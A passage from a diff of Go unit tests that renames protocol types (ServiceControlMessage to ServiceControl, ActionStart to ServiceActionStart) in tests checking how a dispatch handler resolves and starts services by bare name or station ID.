+	assert.Equal(t, protocol.ErrorCodeForbidden, stErr.Code)
 	assert.Empty(t, runner.upserted)
 	assert.Equal(t, 1, existing.Instances)
 }
@@ -808,7 +786,7 @@ func TestHandleServiceControl_ResolvesBareNameAndStationID(t *testing.T) {
 		existing := &model.Task{Name: "heartbeat", Kind: model.KindService, ManualTrigger: true}
 		h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 		runner := h.taskManager.(*fakeTaskRunner)
-		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "heartbeat", Action: protocol.ActionStart})
+		err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "heartbeat", Action: protocol.ServiceActionStart})
 		require.NoError(t, err)
 		assert.Equal(t, []string{"heartbeat"}, runner.startedServices)
 	})
@@ -816,7 +794,7 @@ func TestHandleServiceControl_ResolvesBareNameAndStationID(t *testing.T) {
 	t.Run("ULID of a station-declared service", func(t *testing.T) {
 		h := newDispatchHandler(shellAvailable(), nil)
 		runner := h.taskManager.(*fakeTaskRunner)
-		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: protocol.ActionStart})
+		err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "svc-1", Action: protocol.ServiceActionStart})
 		require.NoError(t, err)
 		assert.Equal(t, []string{"station-svc-1"}, runner.startedServices)
 	})
